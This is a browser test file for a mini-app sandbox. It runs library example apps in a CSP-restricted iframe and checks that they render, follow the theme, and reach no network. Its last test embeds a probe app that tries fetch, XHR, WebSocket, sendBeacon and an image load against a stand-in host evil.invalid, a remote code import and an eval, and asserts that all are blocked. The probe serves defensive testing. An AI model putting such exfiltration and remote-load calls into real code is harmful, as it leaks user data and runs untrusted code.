/**
 * Every canvas_library APP guide's example App.tsx, built by the mini-app
 * bundler (buildApp, with the real runtime's export map) and run in a real
 * browser through the mini-app frame: the frame document and its CSP header
 * (buildAppFrameHtml, buildAppFrameCsp, as the frame route serves them), the
 * real app import map (public/app-runtime/manifest.json, which names the
 * vendored /canvas-runtime/ files), inside a `sandbox="allow-scripts"`
 * iframe, as AppSandbox frames it. Each app must signal ready, report no
 * error, log no console error, load nothing outside the served runtimes,
 * and paint a picture that is not blank.
 *
 * Then the frame's limits, with the libraries in place: no fetch, no request
 * to another origin, no eval.
 *
 * Nothing here touches the network: the page's origin is made up and request
 * interception answers it from server/web/public; every other request is
 * refused and counted.
 *
 * Needs a Chrome and the built runtimes (`pnpm -C server/web build`, or its
 * `canvas-runtime`, `app-runtime` and `share-runtime` scripts). Without
 * either it skips, and says so loudly.
 */
import { existsSync, readFileSync, statSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import type { Browser, HTTPRequest } from 'puppeteer-core';
import { buildApp, type AppSource } from '@mantle/app-build';
import { buildAppFrameCsp, buildAppFrameHtml } from '@mantle/share-ui/app-frame-html';
import { APP_GUIDE_LIBRARIES, appSpecifiers, guideFile } from '../builtins-canvas-library';
import { RENDER_LAUNCH_ARGS } from './sidecar';
import { findChrome } from './find-chrome';

const ROOT = path.resolve(__dirname, '../../../..');
const PUBLIC = path.join(ROOT, 'server/web/public');
const APP_MANIFEST = path.join(PUBLIC, 'app-runtime/manifest.json');
const CANVAS_MANIFEST = path.join(PUBLIC, 'canvas-runtime/manifest.json');
const SHARE_CSS = path.join(PUBLIC, 'share-runtime/styles.css');
const ORIGIN = 'https://app.render.invalid';
/** What the app frame may load, by path prefix (its CSP's). */
const SERVED = ['/app-runtime/', '/canvas-runtime/', '/share-runtime/', '/fonts/'];
const TYPES: Readonly<Record<string, string>> = {
  '.js': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json',
  '.woff2': 'font/woff2',
  '.woff': 'font/woff',
  '.ttf': 'font/ttf',
};

const chrome = findChrome(process.env.MANTLE_TEST_CHROME);
const runtimeBuilt = [APP_MANIFEST, CANVAS_MANIFEST, SHARE_CSS].every((p) => existsSync(p));
if (!chrome || !runtimeBuilt) {
  const bar = '='.repeat(72);
  console.warn(
    [
      bar,
      `APP LIBRARY EXAMPLES SKIPPED: ${!chrome ? 'no Chrome found (set MANTLE_TEST_CHROME)' : 'the app, canvas and share runtimes are not built (pnpm -C server/web build)'}.`,
      'The canvas_library app guides’ examples were not run in a browser.',
      bar,
    ].join('\n'),
  );
}

function appExampleOf(md: string): string {
  const m = /## App example\n+```tsx\n([\s\S]*?)\n```/.exec(md);
  if (!m) throw new Error('no ## App example tsx block');
  return m[1]!;
}

/** The parent: one sandboxed iframe on the frame document, and every
 *  message the frame posts kept for the test. */
const PARENT = `<!doctype html><html><head><meta charset="utf-8"></head>
<body style="margin:0">
<iframe id="app" sandbox="allow-scripts" src="/frame" style="border:0;width:960px;height:640px"></iframe>
<script>
window.__msgs = [];
window.addEventListener('message', function (e) {
  if (e.source !== document.getElementById('app').contentWindow) return;
  var m = e.data; if (!m || m.v !== 1) return;
  if (m.kind === 'ready' || m.kind === 'error' || m.kind === 'probe') window.__msgs.push(m);
});
</script></body></html>`;

/**
 * Installed in every frame before any of its scripts: a record of each way
 * out a library could try on its own. The network APIs (fetch, XHR,
 * WebSocket, EventSource, sendBeacon, a worker, WebRTC, a popup) are wrapped
 * to note the call, and every CSP refusal (an image or font from another
 * origin, a script, an eval) is noted from the frame's own
 * `securitypolicyviolation` event, since a refused load never becomes a
 * request this test could see.
 */
const WATCH = `(() => {
  const log = (w) => { (window.__watch = window.__watch || []).push(w); };
  window.__watch = [];
  document.addEventListener('securitypolicyviolation', (e) =>
    log('csp ' + e.effectiveDirective + ' ' + (e.blockedURI || '')));
  const wrap = (obj, key, name) => {
    const orig = obj && obj[key];
    if (typeof orig !== 'function') return;
    obj[key] = new Proxy(orig, {
      apply(t, self, args) { log(name + ' ' + String(args[0])); return Reflect.apply(t, self, args); },
      construct(t, args) { log(name + ' ' + String(args[0])); return Reflect.construct(t, args); },
    });
  };
  wrap(window, 'fetch', 'fetch');
  wrap(XMLHttpRequest.prototype, 'open', 'xhr');
  wrap(window, 'WebSocket', 'websocket');
  wrap(window, 'EventSource', 'eventsource');
  wrap(navigator, 'sendBeacon', 'beacon');
  wrap(window, 'Worker', 'worker');
  wrap(window, 'SharedWorker', 'sharedworker');
  wrap(window, 'RTCPeerConnection', 'webrtc');
  wrap(window, 'open', 'window.open');
})();`;

type Run = {
  msgs: { kind: string; message?: string; result?: unknown }[];
  consoleErrors: string[];
  refused: string[];
  /** Every path the page loaded, the frame's own requests included. */
  served: string[];
  /** What the frame tried (WATCH); null when the frame never got it. */
  watch: string[] | null;
  png: Buffer;
  /** The picture after a live theme switch (opts.switchTo). */
  pngAfter?: Buffer;
};

type RunOpts = {
  /** The <html> class baked into the frame ('' light, 'dark'). */
  cls?: string;
  /** Emulate prefers-reduced-motion, so two pictures can be compared. */
  reduce?: boolean;
  /** Post a live theme change (the host's theme message) and picture again. */
  switchTo?: string;
  settleMs?: number;
};

describe.skipIf(!chrome || !runtimeBuilt)('mini-app library examples in a real browser', () => {
  let browser: Browser;
  let runtimeExports: Record<string, string[]>;
  let imports: Record<string, string>;
  let importMapJson: string;
  /** The evidence per library, written beside the pictures (MANTLE_APP_SHOTS). */
  const report: Record<string, Record<string, unknown>> = {};
  const shots = process.env.MANTLE_APP_SHOTS;

  beforeAll(async () => {
    const manifest = JSON.parse(readFileSync(APP_MANIFEST, 'utf8')) as {
      imports: Record<string, string>;
      exports: Record<string, string[]>;
    };
    runtimeExports = manifest.exports;
    imports = manifest.imports;
    // As server/web/lib/app-frame.ts reads it.
    importMapJson = JSON.stringify({ imports: manifest.imports });
    const puppeteer = (await import('puppeteer-core')).default;
    browser = await puppeteer.launch({
      executablePath: chrome!,
      headless: true,
      args: [
        ...RENDER_LAUNCH_ARGS,
        '--no-first-run',
        '--use-angle=swiftshader',
        ...(process.platform === 'linux' ? ['--no-sandbox'] : []),
      ],
    });
  }, 60_000);

  afterAll(async () => {
    await browser?.close();
    if (shots) writeFileSync(path.join(shots, 'report.json'), JSON.stringify(report, null, 2));
  });

  /** Answer the made-up origin from public/, refuse and record the rest. */
  function serve(frameHtml: string, refused: string[], served: string[]) {
    return async (req: HTTPRequest) => {
      const url = new URL(req.url());
      if (url.origin !== ORIGIN) {
        refused.push(req.url());
        return req.abort('blockedbyclient');
      }
      // The browser's own icon request, not the app's.
      if (url.pathname === '/favicon.ico') return req.respond({ status: 204, body: '' });
      if (url.pathname === '/parent') {
        return req.respond({ status: 200, contentType: 'text/html', body: PARENT });
      }
      if (url.pathname === '/frame') {
        return req.respond({
          status: 200,
          contentType: 'text/html; charset=utf-8',
          headers: { 'content-security-policy': buildAppFrameCsp(ORIGIN) },
          body: frameHtml,
        });
      }
      const file = path.normalize(path.join(PUBLIC, decodeURIComponent(url.pathname)));
      if (SERVED.some((p) => url.pathname.startsWith(p)) && file.startsWith(PUBLIC + path.sep)) {
        if (existsSync(file)) {
          served.push(url.pathname);
          return req.respond({
            status: 200,
            // An opaque-origin frame's module and font loads are CORS loads.
            headers: { 'access-control-allow-origin': '*' },
            contentType: TYPES[path.extname(file)] ?? 'application/octet-stream',
            body: readFileSync(file),
          });
        }
      }
      refused.push(req.url());
      return req.abort('blockedbyclient');
    };
  }

  async function run(source: AppSource, opts: RunOpts = {}): Promise<Run> {
    const built = await buildApp(source, { runtimeExports });
    expect(built.errors, 'build errors').toEqual([]);
    expect(built.ok).toBe(true);
    const frameHtml = buildAppFrameHtml({
      bundleCode: built.code!,
      appCss: built.css ?? '',
      importMapJson,
      cls: opts.cls ?? '',
      colorTheme: null,
      viewport: true,
    });
    const page = await browser.newPage();
    const consoleErrors: string[] = [];
    const refused: string[] = [];
    const served: string[] = [];
    try {
      await page.setViewport({ width: 980, height: 660 });
      if (opts.reduce) {
        await page.emulateMediaFeatures([{ name: 'prefers-reduced-motion', value: 'reduce' }]);
      }
      await page.evaluateOnNewDocument(WATCH);
      page.on('console', (m) => {
        if (m.type() === 'error') consoleErrors.push(m.text());
      });
      page.on('pageerror', (e) => consoleErrors.push(String(e)));
      await page.setRequestInterception(true);
      page.on('request', serve(frameHtml, refused, served));
      await page.goto(`${ORIGIN}/parent`, { waitUntil: 'load', timeout: 20_000 });
      await page.waitForFunction(
        () =>
          (window as unknown as { __msgs: { kind: string }[] }).__msgs.some(
            (m) => m.kind === 'ready' || m.kind === 'error',
          ),
        { timeout: 20_000 },
      );
      await new Promise((r) => setTimeout(r, opts.settleMs ?? 1500));
      const msgs = (await page.evaluate(
        () => (window as unknown as { __msgs: unknown[] }).__msgs,
      )) as Run['msgs'];
      const frame = page.frames().find((f) => f.url().endsWith('/frame'));
      const watch = frame
        ? ((await frame.evaluate(
            () => (window as unknown as { __watch?: string[] }).__watch ?? null,
          )) as string[] | null)
        : null;
      const el = await page.$('#app');
      const png = Buffer.from(await el!.screenshot({ type: 'png' }));
      let pngAfter: Buffer | undefined;
      if (opts.switchTo !== undefined) {
        await page.evaluate((cls: string) => {
          const f = document.getElementById('app') as HTMLIFrameElement;
          f.contentWindow!.postMessage({ v: 1, kind: 'theme', cls }, '*');
        }, opts.switchTo);
        await new Promise((r) => setTimeout(r, 800));
        pngAfter = Buffer.from(await el!.screenshot({ type: 'png' }));
      }
      return { msgs, consoleErrors, refused, served, watch, png, pngAfter };
    } finally {
      await page.close();
    }
  }

  /** Sample the pictures on one grid: distinct colours of the first, and
   *  the share of points where the two differ (by more than antialiasing). */
  async function sample(a: Buffer, b?: Buffer): Promise<{ colours: number; differ: number }> {
    const page = await browser.newPage();
    try {
      return await page.evaluate(
        async (srcA: string, srcB: string | null) => {
          const pixels = async (src: string) => {
            const img = new Image();
            img.src = src;
            await img.decode();
            const c = document.createElement('canvas');
            c.width = img.naturalWidth;
            c.height = img.naturalHeight;
            const g = c.getContext('2d')!;
            g.drawImage(img, 0, 0);
            const out: number[][] = [];
            for (let y = 0; y < c.height; y += Math.max(1, Math.floor(c.height / 80))) {
              for (let x = 0; x < c.width; x += Math.max(1, Math.floor(c.width / 120))) {
                out.push(Array.from(g.getImageData(x, y, 1, 1).data.slice(0, 3)));
              }
            }
            return out;
          };
          const pa = await pixels(srcA);
          const colours = new Set(pa.map((p) => p.join(','))).size;
          if (!srcB) return { colours, differ: 0 };
          const pb = await pixels(srcB);
          let n = 0;
          pa.forEach((p, i) => {
            const q = pb[i]!;
            if (Math.abs(p[0]! - q[0]!) + Math.abs(p[1]! - q[1]!) + Math.abs(p[2]! - q[2]!) > 24)
              n++;
          });
          return { colours, differ: n / pa.length };
        },
        `data:image/png;base64,${a.toString('base64')}`,
        b ? `data:image/png;base64,${b.toString('base64')}` : null,
      );
    } finally {
      await page.close();
    }
  }

  for (const lib of APP_GUIDE_LIBRARIES) {
    const example = () =>
      appExampleOf(
        readFileSync(path.join(ROOT, 'docs/canvas-libraries/app', guideFile(lib)), 'utf8'),
      );

    it(`${lib.name}: builds, runs clean, reaches nothing outside the runtime, no eval, not blank`, async () => {
      const r = await run({ entry: 'App.tsx', files: { 'App.tsx': example() } });
      if (shots) writeFileSync(path.join(shots, `${lib.name}.png`), r.png);
      const specs = appSpecifiers(lib);
      report[lib.name] = {
        ...report[lib.name],
        imports: specs,
        files: specs.map((s) => imports[s]),
        bytes: specs.map((s) => statSync(path.join(PUBLIC, imports[s]!)).size),
        served: [...new Set(r.served)].sort(),
        watch: r.watch,
      };
      expect(
        r.msgs.filter((m) => m.kind === 'error'),
        `${lib.name} reported`,
      ).toEqual([]);
      expect(
        r.msgs.some((m) => m.kind === 'ready'),
        `${lib.name} ready`,
      ).toBe(true);
      expect(r.consoleErrors, `${lib.name} console`).toEqual([]);
      // (a) and (b): no request outside the served runtimes, no network API
      // called, and no CSP refusal of any kind (an image, a font or a script
      // from elsewhere, an eval).
      expect(r.refused, `${lib.name} refused requests`).toEqual([]);
      expect(r.watch, `${lib.name}: the frame's watch`).toEqual([]);
      // Its own module was served from the runtime, so the run proves something.
      for (const s of specs) expect(r.served, s).toContain(imports[s]);
      expect((await sample(r.png)).colours, `${lib.name} is blank`).toBeGreaterThan(3);
    }, 60_000);

    it(`${lib.name}: follows the theme, baked and on a live switch`, async () => {
      const files = { 'App.tsx': example() };
      const dark = await run({ entry: 'App.tsx', files }, { cls: 'dark', reduce: true });
      const live = await run({ entry: 'App.tsx', files }, { reduce: true, switchTo: 'dark' });
      if (shots) {
        writeFileSync(path.join(shots, `${lib.name}.dark.png`), dark.png);
        writeFileSync(path.join(shots, `${lib.name}.live-dark.png`), live.pngAfter!);
      }
      for (const r of [dark, live]) {
        expect(r.consoleErrors, `${lib.name} console`).toEqual([]);
        expect(r.watch, `${lib.name} watch`).toEqual([]);
      }
      // The dark picture is not the light one...
      const lightVsDark = (await sample(live.png, dark.png)).differ;
      // ...and a live switch ends where a dark load starts: the library's
      // own colours were read again, not kept from the light theme.
      const liveVsDark = (await sample(live.pngAfter!, dark.png)).differ;
      report[lib.name] = { ...report[lib.name], lightVsDark, liveVsDark };
      expect(lightVsDark, `${lib.name}: dark differs from light`).toBeGreaterThan(0.3);
      expect(liveVsDark, `${lib.name}: a live switch matches a dark load`).toBeLessThan(0.02);
    }, 90_000);
  }

  it('only d3 and echarts carry an eval path, and each is named', () => {
    // Every library module an app can import, scanned for the two ways to
    // compile code at run time. The app frame has no 'unsafe-eval', so a
    // call throws EvalError (catchable; the frame lives on, next test).
    //  - d3: dsv's objectConverter (csvParse, tsvParse, dsvFormat().parse)
    //  - echarts: parseJSON's fallback when there is no JSON.parse (never in
    //    a browser this frame runs in)
    const withEval = Object.entries(imports)
      .filter(([, url]) => url.endsWith('.js'))
      .filter(([, url]) =>
        /new Function\(|[^.\w]eval\(/.test(readFileSync(path.join(PUBLIC, url), 'utf8')),
      )
      .map(([spec]) => spec)
      .sort();
    expect(withEval).toEqual(['d3', 'echarts']);
  });

  it('the frame still has no network and no eval, with the libraries loaded', async () => {
    const probe = [
      "import { useEffect } from 'react';",
      "import * as echarts from 'echarts';",
      "import * as d3 from 'd3';",
      'async function check() {',
      '  const out: Record<string, string> = { echarts: typeof echarts.init };',
      "  try { await fetch('/api/version'); out.fetch = 'allowed'; } catch { out.fetch = 'refused'; }",
      "  try { new Function('return 1')(); out.eval = 'allowed'; } catch (e) { out.eval = (e as Error).name; }",
      // A library's eval path: a catchable EvalError, and the app runs on.
      "  try { d3.csvParse('a,b\\n1,2'); out.csvParse = 'allowed'; } catch (e) { out.csvParse = (e as Error).name; }",
      "  out.csvParseRows = String(d3.csvParseRows('a,b\\n1,2').length);",
      "  try { const x = new XMLHttpRequest(); x.open('GET', 'https://evil.invalid/xhr'); x.send(); out.xhr = 'sent'; } catch { out.xhr = 'refused'; }",
      "  try { new WebSocket('wss://evil.invalid/ws'); out.ws = 'opened'; } catch { out.ws = 'refused'; }",
      "  try { out.beacon = String(navigator.sendBeacon('https://evil.invalid/beacon', 'd')); } catch { out.beacon = 'refused'; }",
      // A computed URL: the bundler refuses a literal one before the frame sees it.
      "  const cdn = ['https://cdn.invalid', 'x.js'].join('/');",
      "  try { await import(cdn); out.cdn = 'allowed'; } catch { out.cdn = 'refused'; }",
      // A library file the app may not import is still not an app import:
      // the frame lets the path load, but nothing in the bundle names it.
      "  try { await import(['/canvas-runtime', 'nope.js'].join('/')); out.missing = 'loaded'; } catch { out.missing = 'refused'; }",
      "  const img = new Image(); img.src = 'https://evil.invalid/p.png';",
      "  window.parent.postMessage({ v: 1, kind: 'probe', result: out }, '*');",
      '}',
      'export default function App() {',
      '  useEffect(() => { void check(); }, []);',
      '  return <p>probe</p>;',
      '}',
    ].join('\n');
    const r = await run({ entry: 'App.tsx', files: { 'App.tsx': probe } });
    const result = r.msgs.find((m) => m.kind === 'probe')?.result;
    expect(result).toEqual({
      echarts: 'function',
      fetch: 'refused',
      eval: 'EvalError',
      csvParse: 'EvalError',
      csvParseRows: '2',
      // XHR and WebSocket construct; the CSP refuses the connection itself.
      xhr: 'sent',
      ws: 'opened',
      // sendBeacon only queues: true here, then the CSP refuses the send.
      beacon: 'true',
      cdn: 'refused',
      missing: 'refused',
    });
    // Each try was refused by the CSP before a request left the frame; only
    // the same-origin runtime path reached the server (a 404).
    expect(r.refused).toEqual([`${ORIGIN}/canvas-runtime/nope.js`]);
    const csp = (r.watch ?? []).filter((w) => w.startsWith('csp '));
    for (const want of [
      /csp connect-src .*\/api\/version/,
      /csp script-src eval/,
      /csp connect-src https:\/\/evil\.invalid\/xhr/,
      /csp connect-src wss:\/\/evil\.invalid\/ws/,
      /csp connect-src https:\/\/evil\.invalid\/beacon/,
      /csp script-src-elem https:\/\/cdn\.invalid/,
      /csp img-src https:\/\/evil\.invalid/,
    ]) {
      expect(
        csp.some((w) => want.test(w)),
        `${want} in ${csp.join(' | ')}`,
      ).toBe(true);
    }
  }, 60_000);
});
